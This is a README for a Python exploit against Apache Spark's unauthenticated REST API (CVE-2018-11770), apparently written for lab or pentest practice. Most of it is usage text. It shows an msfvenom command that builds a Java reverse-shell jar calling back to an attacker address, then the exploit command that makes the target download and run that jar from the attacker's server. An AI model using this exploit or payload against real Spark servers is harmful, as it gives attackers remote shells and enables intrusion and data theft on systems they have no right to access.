# CVE-2018-11770 Apache Spark Unauthenticated Reverse Shell RCE 
Standalone Python 3 RCE exploit for Apache Spark rewritten from [this Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/spark_unauth_rce.rb)

Exploit POC [explained here](https://medium.com/@Alibaba_Cloud/alibaba-cloud-security-team-discovers-apache-spark-rest-api-remote-code-execution-rce-exploit-a5fdb8fbd173). The exploit code itself is [explained here](https://ivanitlearning.wordpress.com/2019/10/15/ruby-exploit-rewrite-apache-spark-rce/).

Tested with Python 3.7 [on this target](https://github.com/vulhub/vulhub/tree/master/spark/unacc).

## Usage:
```
root@Kali:~/Infosec/RubyStuff/Apache-Spark-RCE# msfvenom -p java/shell_reverse_tcp LHOST=192.168.92.134 LPORT=4444 -f jar -o payload/exploit.jar
Payload size: 7550 bytes
Final size of jar file: 7550 bytes
Saved as: payload/exploit.jar

root@Kali:~/Infosec/RubyStuff/Apache-Spark-RCE# ./CVE-2018-11770.py -h
usage: CVE-2018-11770.py [-h] [-httpdelay HTTPDELAY] -rhost RHOST
                         [-rport RPORT] -srvhost SRVHOST [-srvport SRVPORT]
                         [-uripath URIPATH] -payload PAYLOAD

Call the exploit like this: 
./CVE-2018-11770.py -httpdelay 10 -rhost 192.168.92.153 -rport 6066 -srvhost 192.168.92.134 -srvport 8080 -uripath path -payload exploit.jar

Required arguments:
  -rhost RHOST          Target host running Apache Spark eg. 192.168.92.153
  -srvhost SRVHOST      The local host to listen on. This must be an address on the local machine that Apache Spark can reach eg 192.168.92.134
  -payload PAYLOAD      Path to the malicious jar. eg dir/exploit.jar

Optional arguments:
  -httpdelay HTTPDELAY  Number of seconds the web server will wait before termination. Default: 10s
  -rport RPORT          Target port running Apache Spark. Default: 6066
  -srvport SRVPORT      The local port to listen on. Default: 8080
  -uripath URIPATH      The URI path for Webserver to serve for this exploit Default: path  as in eg. http://192.168.92.134/path

root@Kali:~/Infosec/RubyStuff/Apache-Spark-RCE# ./CVE-2018-11770.py -rhost 192.168.92.153 -srvhost 192.168.92.134 -payload payload/exploit.jar 
Started Web server...
Sending the payload to the server...
```
